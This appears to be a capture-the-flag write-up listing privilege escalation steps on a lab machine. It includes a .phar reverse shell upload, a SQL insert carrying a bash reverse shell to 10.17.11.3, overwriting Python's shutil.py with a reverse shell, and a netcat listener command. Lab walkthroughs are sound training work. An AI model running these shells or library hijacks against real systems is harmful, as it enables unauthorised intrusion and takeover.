# Privilege Escalation Steps

## 1. Search for a Directory
- Log in as the `admin` user with the password `password`.
- Upload a reverse shell with a `.phar` extension and execute it to gain a shell.

## 2. Search for `test.py` in the `/opt` Directory
- Find `test.py` in the `/opt` directory.
- Gained access as the `lucien` user.

## 3. Escalate via MySQL
- Check the `.bash_history` of the `lucien` user.
- Login to MySQL and inject a reverse shell payload into the `library` database in the `dreams` table. Use this SQL command:
  ```sql
  INSERT INTO dreams (dreamer, dream) 
  VALUES ('root', '$(echo "/bin/bash -i >& /dev/tcp/10.17.11.3/9999 0>&1" | bash)');

```

- Execute the payload as the `death` user (after verifying `sudo -l` permissions) to get a shell as `death`.

## 4. Escalate via `restore.py`

- Locate the `restore.py` file in the `morpheus` user's home directory.
- Modify the Python library in `/usr/lib/python3.8/shutil.py` to include a reverse shell. Use this command:
- ```echo "import os;os.system(\"bash -c 'bash -i >& /dev/tcp/127.0.0.1/9001 0>&1'\")" > /usr/lib/python3.8/shutil.py
- Wait for `restore.py` to be executed as the `morpheus` user. It will import the payload from `shutil.py` and give you a reverse shell as `morpheus`.

---

### Key Points

- **Reverse Shell**: Always ensure the reverse shell listener is active on your machine (e.g., with `nc -lvnp 9999`).
- **MySQL Injection**: The reverse shell payload inserted into the `library` database will execute when the `death` user runs the query.
- **Python Payload**: The `restore.py` file will execute the reverse shell if the script is triggered, giving you a reverse shell as `morpheus`.
- done.
